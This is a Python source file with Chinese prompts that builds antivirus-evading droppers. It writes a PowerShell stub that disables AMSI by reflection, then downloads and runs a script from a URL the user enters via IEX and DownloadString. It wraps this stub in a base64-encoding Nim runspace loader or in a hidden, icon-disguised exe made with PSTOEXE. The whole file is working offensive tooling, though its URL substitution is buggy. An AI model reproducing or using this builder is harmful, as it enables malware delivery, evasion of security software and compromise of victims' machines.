from ast import While
import base64
from email.mime import base
from msilib.schema import Icon
from pdb import runcall
import sys, os, argparse, random, string
from time import sleep
from unittest import loader

graphical = """
  ___   _   _       _      ____                     
 |_ _| | \ | | ___ | |_   / ___|_ __ ___  ___ _ __  
  | |  |  \| |/ _ \| __| | |  _| '__/ _ \/ _ \ '_ \ 
  | |  | |\  | (_) | |_  | |_| | | |  __/  __/ | | |
 |___| |_| \_|\___/ \__|  \____|_|  \___|\___|_| |_| 

 bilibli:
 Github:
                                                                                                          
"""

stub = """
import winim/clr
import base64
var Automation = load("System.Management.Automation")
var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
var runspace = @RunspaceFactory.CreateRunspace()
runspace.Open()
var pipeline = runspace.CreatePipeline()
let strdecode = decode("REPLACED")
pipeline.Commands.AddScript(strdecode)
pipeline.Invoke()
runspace.Close()

"""
PowerShell_stub = """
Set-Variable -Name w -Value ('System.Management.Automation.A');Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));$field.SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString("GREEN")
"""

Loading_method = """
1.Automation的加载方式(无图标)
                _                        _   _               _                     _ _             
     /\        | |                      | | (_)             | |                   | (_)            
    /  \  _   _| |_ ___  _ __ ___   __ _| |_ _  ___  _ __   | |     ___   __ _  __| |_ _ __   __ _ 
   / /\ \| | | | __/ _ \| '_ ` _ \ / _` | __| |/ _ \| '_ \  | |    / _ \ / _` |/ _` | | '_ \ / _` |
  / ____ \ |_| | || (_) | | | | | | (_| | |_| | (_) | | | | | |___| (_) | (_| | (_| | | | | | (_| |
 /_/    \_\__,_|\__\___/|_| |_| |_|\__,_|\__|_|\___/|_| |_| |______\___/ \__,_|\__,_|_|_| |_|\__, |
                                                                                              __/ |
                                                                                             |___/ 
2.PSTOEXE的加载方式(有图标)
   _____   _____ _______ ____  ________   ________   _                     _ _             
 |  __ \ / ____|__   __/ __ \|  ____\ \ / /  ____| | |                   | (_)            
 | |__) | (___    | | | |  | | |__   \ V /| |__    | |     ___   __ _  __| |_ _ __   __ _ 
 |  ___/ \___ \   | | | |  | |  __|   > < |  __|   | |    / _ \ / _` |/ _` | | '_ \ / _` |
 | |     ____) |  | | | |__| | |____ / . \| |____  | |___| (_) | (_| | (_| | | | | | (_| |
 |_|    |_____/   |_|  \____/|______/_/ \_\______| |______\___/ \__,_|\__,_|_|_| |_|\__, |
                                                                                     __/ |
                                                                                    |___/  
                                                                                                                                                                         
"""

def main(PowerShell_stub, stub, verbose):
    print(graphical)
    PowerShell_stub = input("请输入网址：")        
    PowerShell_stub = PowerShell_stub.replace("GREEN", PowerShell_stub)
    #int(PowerShell_stub)
    PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")     
    stub = stub.replace("REPLACED", PowerShell_stubEncryption)
    #print(stub)
    print("选择以下几种PowerShell的打包方式:\n")    
    print(Loading_method)
    
    BypassAntivirus = input("请选择PowerShell的打包方式:")
    if verbose == True:                    
          if BypassAntivirus == "1":
                print("[+] 启用详细消息")
                f = open("stub.nim", "w")
                f.write(stub)
                f.close()
                sleep(1)
                print("[+] 将新存根保存到 stub.nim")
                sleep(1)
                print("[+] 编译新存根...")             
                os.system("nim c -r -d:mingw --app:gui stub.nim")                
                os.system("del stub.nim")
          if BypassAntivirus == "2":          
                Icon = input("请输入icon格式图标路径:")
                print("[+] 启用详细消息")
                f = open("stub.ps1", "w")
                f.write(PowerShell_stub)
                f.close()
                sleep(1)
                print("[+] 将新存根保存到 stub.ps1")
                sleep(1)
                print("[+] 编译新存根...")             
                os.system("powershell .\PSTOEXE.ps1 -inputFile 'stub.ps1' -iconFile {} -outputFile 'stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS".format(Icon))               
                os.system("del stub.ps1")
          else:
                print("没有该选项请重新输入:\n")
                return verbose

          
main(PowerShell_stub, stub, verbose=True)


